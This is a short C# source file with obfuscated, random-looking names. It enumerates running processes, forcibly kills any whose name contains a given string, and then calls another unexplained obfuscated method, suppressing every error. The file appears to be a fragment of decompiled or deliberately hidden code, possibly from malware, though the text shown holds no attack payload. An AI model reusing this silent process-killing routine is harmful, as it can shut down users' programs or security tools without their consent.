using System;
using System.Diagnostics;

namespace frgoWklvEOSV;

public sealed class xctUtgFsRkGVFBEL
{
	public static bool RNfapZoVNfqwThPb(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void mwRnumQnlYxOfki(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (RNfapZoVNfqwThPb(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					PFruJiQrcriiZ.yQfvyropwD();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
